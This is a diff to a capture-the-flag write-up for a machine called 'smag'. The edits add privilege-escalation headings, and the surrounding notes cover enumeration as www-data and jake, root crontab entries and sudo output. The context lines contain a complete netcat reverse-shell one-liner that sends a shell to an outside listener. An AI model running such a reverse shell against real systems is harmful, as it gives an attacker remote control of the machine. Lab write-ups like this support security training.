@@ -171,10 +171,14 @@ development             [Status: 200, Size: 1176, Words: 76, Lines: 18, Duration
 run reverse shell
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.30.202 9001 >/tmp/f
 
+
+### Privilage Escalation 1
+
 get access as www-date
 run linpease
 
-#### Found in crontab
+#### Found entry in crontab
+
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
@@ -185,6 +189,8 @@ run linpease
 
 get access as jake
 run linpeas
+
+### Privilage Escalation 2
 
 jake@smag:/tmp$ sudo -l
 Matching Defaults entries for jake on smag:
